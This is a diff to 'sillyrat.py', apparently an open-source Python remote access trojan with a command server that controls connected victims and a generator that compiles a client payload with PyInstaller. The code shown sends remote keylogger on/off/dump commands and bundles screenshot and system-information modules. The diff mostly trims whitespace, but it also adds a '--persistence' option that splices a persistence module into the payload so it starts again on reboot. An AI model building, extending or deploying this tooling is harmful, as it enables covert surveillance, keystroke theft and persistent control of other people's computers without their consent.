@@ -14,53 +14,54 @@ import PyInstaller.__main__
 from datetime import datetime
 
 __LOGO__ = """
- ____  _ _ _       ____      _  _____ 
+ ____  _ _ _       ____      _  _____
 / ___|(_) | |_   _|  _ \\    / \\|_   _|
-\\___ \\| | | | | | | |_) |  / _ \\ | |  
- ___) | | | | |_| |  _ <  / ___ \\| |  
-|____/|_|_|_|\\__, |_| \\_\\/_/   \\_\\_|  
-             |___/                    
+\\___ \\| | | | | | | |_) |  / _ \\ | |
+ ___) | | | | |_| |  _ <  / ___ \\| |
+|____/|_|_|_|\\__, |_| \\_\\/_/   \\_\\_|
+             |___/
                     %s v1.0 @hash3liZer/@TheFlash2k
 """
 
 __HELP_OVERALL__ = """usage: python3 sillyray.py command [--help] [--option OPTION]
 
-These are the commands available for usage: 
-   
+These are the commands available for usage:
+
     bind        Run the Server on machine and establish connections
     generate    Generate the Payload file for target platform
 
 You can further get help on available commands by supplying
 '--help' argument. For example: 'python3 sillyrat generate --help'
-will print help manual for generate commmand 
+will print help manual for generate commmand
 """
 
 __HELP_BIND__   = """usage: python3 sillyrat.py bind [--address ADDRESS] [--port PORT]
 
-    Args            Description
-    -h, --help      Show Help for Bind command
-    -a, --address   IP Address to Bind to
-    -p, --port      Port Number on which to Bind
+    Args              Description
+    -h, --help        Show Help for Bind command
+    -a, --address     IP Address to Bind to
+    -p, --port        Port Number on which to Bind
 
 The Bind command is used to bind the application on server
-for incoming connections and control the clients through 
+for incoming connections and control the clients through
 the command interface
 """
 
 __HELP_GENERATE__ = """
 usage: python3 sillyrat.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]
 
-    Args            Description
-    -h, --help      Show Help Manual for generate command
-    -a, --address   IP Address of server. [Connect to]
-    -p, --port      Port of connecting server
-    -o, --output    Output file to generate
-    -s, --source    Do not generate compiled code.
-                    Gives Python source file.
+    Args              Description
+    -h, --help        Show Help Manual for generate command
+    -a, --address     IP Address of server. [Connect to]
+    -p, --port        Port of connecting server
+    -o, --output      Output file to generate
+    -s, --source      Do not generate compiled code.
+                      Gives Python source file.
+        --persistence Auto start on reboot [Under Development]
 
 The generate command generates the required payload
 file to be executed on client side. The establish
-connection to server and do commands. 
+connection to server and do commands.
 """
 
 class PULL:
@@ -81,7 +82,7 @@ class PULL:
     def __init__(self):
         if not self.support_colors:
             self.win_colors()
-    
+
     def support_colors(self):
         plat = sys.platform
         supported_platform = plat != 'Pocket PC' and (plat != 'win32' or \
@@ -251,11 +252,11 @@ class PULL:
         global __HELP_GENERATE__
         print(__HELP_GENERATE__)
         sys.exit(0)
-    
+
 pull = PULL()
 
 class CLIENT:
-    
+
     STATUS = "Active"
     MESSAGE = ""
     KEY     = ")J@NcRfU"
@@ -296,7 +297,7 @@ class CLIENT:
         while not self.MESSAGE:
             try:
                 pass
-            except KeyboardInterrupt: 
+            except KeyboardInterrupt:
                 break
         rtval = self.MESSAGE
         self.MESSAGE = ""
@@ -389,7 +390,7 @@ class COMMCENTER:
                         self.CURRENT[1].send_data(val)
                         result = self.CURRENT[1].recv_data()
                         if result.strip(" "):
-                          print(result)  
+                          print(result)
                     else:
                         break
         else:
@@ -409,13 +410,13 @@ class COMMCENTER:
                     self.CURRENT[1].send_data("keylogger:on")
                     result = self.CURRENT[1].recv_data()
                     if result.strip(" "):
-                        print(result) 
+                        print(result)
 
                 elif args[1] == "off":
                     self.CURRENT[1].send_data("keylogger:off")
                     result = self.CURRENT[1].recv_data()
                     if result.strip(" "):
-                        print(result) 
+                        print(result)
 
                 elif args[1] == "dump":
                     self.CURRENT[1].send_data("keylogger:dump")
@@ -432,7 +433,7 @@ class COMMCENTER:
                     fl.write( result )
                     fl.close()
                     pull.print("Dumped: [" + pull.GREEN + fullpath + pull.END + "]")
-                    
+
                 else:
                     pull.error("Invalid Syntax!")
             else:
@@ -514,7 +515,7 @@ class INTERFACE(COMMCENTER):
                     client
                 )
             )
-                
+
 
     def accept(self):
         t = threading.Thread(target=self.accept_threads)
@@ -567,10 +568,12 @@ class GENERATOR:
         self.address = prs.address
         self.port    = prs.port
         self.source  = prs.source
+        self.persistence = prs.persistence
         self.output  = self.get_output(prs.output)
         self.pather  = self.get_path()
         self.v_imports = self.get_imports()
         self.v_consts  = self.get_consts()
+        self.v_persistence = self.get_persistence()
         self.v_sysinfo = self.get_sysinfo()
         self.v_screenshot = self.get_screenshot()
         self.v_client  = self.get_client()
@@ -615,13 +618,20 @@ class GENERATOR:
         data = "CONSTIP = \"%s\"\nCONSTPT = %i" % (self.address, self.port)
         return data
 
+    def get_persistence(self):
+        topen = os.path.join(self.pather, "persistence.py")
+        fl = open(topen)
+        data = fl.read()
+        fl.close()
+        return data
+
     def get_sysinfo(self):
         topen = os.path.join(self.pather, 'sysinfo.py')
         fl = open(topen)
         data = fl.read()
         fl.close()
         return data
-    
+
     def get_screenshot(self):
         topen = os.path.join(self.pather, 'screenshot.py')
         fl = open(topen)
@@ -646,7 +656,7 @@ class GENERATOR:
     def tmp_dir(self):
         dirname = os.path.dirname(__file__)
         dirname = os.path.join(dirname, 'tmp')
-        
+
         if not os.path.isdir(dirname):
             os.mkdir(dirname)
 
@@ -657,7 +667,7 @@ class GENERATOR:
     def patch(self):
         time.sleep(2)
         pull.function("Compiling modules ... ")
-        self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_sysinfo + "\n\n" + \
+        self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_persistence + "\n" + self.v_sysinfo + "\n\n" + \
                 self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
         pull.function("Generating source code ...")
@@ -671,7 +681,7 @@ class GENERATOR:
     def generate(self):
         time.sleep(2)
         pull.function("Compiling modules ... ")
-        self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_sysinfo + "\n\n" + \
+        self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
                 self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
         pull.function("Generating one time code for binary ")
@@ -701,7 +711,7 @@ class GENERATOR:
             sys.stdout.write("\r" + pull.BLUE + "[" + pull.UNDERLINE + ":" + pull.END + pull.BLUE + "] " + pull.END + "Elapsed Time: %is" % (counter) + pull.END)
             time.sleep(1)
             counter += 1
-        
+
         sys.stdout.write("\n")
         pull.print("Compiled Successfully!")
 
@@ -726,6 +736,7 @@ class PARSER:
             self.port    = self.v_port(prs.port)
             self.output  = self.v_output(prs.output)
             self.source  = prs.source
+            self.persistence = prs.persistence
 
     def v_help(self, hl):
         if hl:
@@ -745,7 +756,7 @@ class PARSER:
     def v_port(self, port):
         if not port:
             pull.exit("You need to Supply a Valid Port Number")
-        
+
         if port <= 0 or port > 65535:
             pull.exit("Invalid Port Number")
 
@@ -766,7 +777,7 @@ class PARSER:
             if os.path.isdir(os.path.dirname(val)):
                 return val
             else:
-                pull.exit("Directory doesn't exist!") 
+                pull.exit("Directory doesn't exist!")
         else:
             pull.exit("You must provide an output Path!")
 
@@ -781,6 +792,7 @@ def main():
     parser.add_argument('-p', '--port'   , dest="port"   , default=0 , type=int, help="Port to Bind to")
     parser.add_argument('-o', '--output' , dest="output" , default="", type=str, help="Complete Path to Output File!")
     parser.add_argument('-s', '--source' , dest="source" , default=False, action="store_true", help="Source file")
+    parser.add_argument('--persistence'  , dest="persistence", default=False, action="store_true", help="Persistence")
 
     parser = parser.parse_args()
 
